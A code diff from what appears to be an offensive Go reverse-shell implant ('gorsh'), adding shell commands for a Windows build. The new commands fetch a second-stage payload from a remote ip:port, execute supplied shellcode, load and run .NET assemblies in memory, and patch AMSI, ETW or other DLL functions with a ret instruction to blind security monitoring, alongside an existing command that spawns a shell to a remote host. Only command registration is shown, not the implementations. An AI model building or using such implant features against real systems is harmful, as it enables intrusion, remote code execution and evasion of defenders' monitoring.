@@ -1,9 +1,10 @@
-//go:build !windows
-
 package cmds
 
 import (
+	"strings"
+
 	"github.com/abiosoft/ishell"
+	"github.com/audibleblink/gorsh/internal/execute_assembly"
 )
 
 func RegisterCommands(sh *ishell.Shell) {
@@ -140,6 +141,61 @@ func RegisterCommands(sh *ishell.Shell) {
 		Help:     "spawn [host:port]",
 		LongHelp: "Spawns a new shell to [host:port]. Spawns a new shell to the embedded host:port if no arguments are passed.",
 		Func:     Spawn,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "met",
+		Help:     "met <https|tcp> <ip:port>",
+		LongHelp: "Fetch a second stage from ip:port",
+		Func:     Met,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "inject",
+		Help:     "inject <base64_shellcode>",
+		LongHelp: "Execute shellcode",
+		Func:     Inject,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "load",
+		Help:     "load [list] <assemblyName>",
+		LongHelp: "Loads an assembly into the current process for later execution",
+		Func:     LoadAssembly,
+		Completer: func([]string) (ass []string) {
+			dirs, _ := execute_assembly.Assemblies.ReadDir("assemblies")
+			for _, fsEntry := range dirs {
+				base := strings.Split(fsEntry.Name(), ".")[0]
+				ass = append(ass, base)
+			}
+			return
+		},
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "unload",
+		Help:     "unload",
+		LongHelp: "Unload current assembly",
+		Func:     UnloadAssembly,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name: ".",
+		Help: "Pass args to the currently enable assembly",
+		Func: ExecuteAssembly,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "unhook",
+		Help:     "unhook < amsi | etw | dllname.FuncName >",
+		LongHelp: "Finds a module in the PEB and calls GetProcAddress. Then patches the base function address with a ret instruction.",
+		Func:     Unhook,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name: "dlls",
+		Help: "Print loaded DLLs",
+		Func: ListDlls,
 	})
 
 	sh.AddCmd(&ishell.Cmd{
